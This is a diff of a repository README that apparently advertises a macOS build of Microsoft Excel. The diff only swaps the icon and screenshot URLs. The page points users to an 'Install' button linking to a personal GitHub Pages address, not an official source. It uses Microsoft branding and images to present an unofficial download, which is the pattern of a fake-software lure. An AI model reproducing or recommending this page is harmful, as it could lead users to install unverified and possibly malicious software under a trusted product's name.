@@ -1,9 +1,9 @@
-<p align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/_Office_Excel_%282019%E2%80%932025%29.svg/960px-_Office_Excel_%282019%E2%80%932025%29.svg.png" width="100" alt="Excel icon"/></p>
+<p align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Microsoft_Office_Excel_%282019%E2%80%932025%29.svg/960px-Microsoft_Office_Excel_%282019%E2%80%932025%29.svg.png" width="100" alt="Excel icon"/></p>
 <h1 align="center">Excel</h1>
 <p align="center">Native spreadsheet and data analysis — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
 <p align="center"><a href="https://slavik-busterenko.github.io/.github/excel"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
-<p align="center"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQowSqpG8Fw7fggJ6R0h2dJXzWj11YSUl3NAmBpuNu0gxc0jFcexB9rWCg8&s=10" alt="Excel — macOS spreadsheet and data analysis screenshot" width="780"/></p>
+<p align="center"><img src="https://learn-attachment.microsoft.com/api/attachments/d6c08d13-669f-41a3-a415-788dc2ee6744?platform=QnA" alt="Excel — macOS spreadsheet and data analysis screenshot" width="780"/></p>
 
 ---
 
